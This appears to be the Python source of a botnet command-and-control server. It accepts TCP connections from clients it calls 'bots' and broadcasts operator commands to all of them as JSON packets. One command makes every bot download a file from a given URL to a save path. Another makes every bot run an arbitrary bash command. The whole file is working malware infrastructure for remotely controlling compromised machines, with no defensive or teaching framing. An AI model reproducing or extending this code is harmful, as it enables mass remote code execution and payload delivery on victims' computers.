import socket
import sys
import json
import threading
from termcolor import colored, cprint

bots_connected = []

def input_thread(bots_connected):
    while True:
        raw_inp = input(colored("/>", "yellow"))
        if raw_inp:
            splitted = raw_inp.split()
            cmd = splitted[0]
            args = splitted[1:]
            if cmd == "stop":
                print(colored("Stopped", "red"))
                sock.close()
                break
                exit()
            elif cmd == "download":
                packet = {"action": 2, "url": args[0], "save_path": args[1]}
                packet = bytes(json.dumps(packet), encoding="utf-8")
                broadcast(packet, bots_connected)
            elif cmd == "exec":
                packet = {"action": 3, "bash": args[0]}
                packet = bytes(json.dumps(packet), encoding="utf-8")
                broadcast(packet, bots_connected)


def broadcast(dt, bots_connected):
    for bot in bots_connected:
        bot.send(dt)
        

try:
    port = int(sys.argv[1])
except IndexError:
    print("Not enough args")
    exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
sock.bind(('', port)) 
sock.listen()
print(colored('Main server started!', "green"))
threading.Thread(target=input_thread, args=(bots_connected, )).start()
while True:
    conn, addr = sock.accept() 
    print(colored('New bot:', "green"), addr)  
    bots_connected.append(conn)
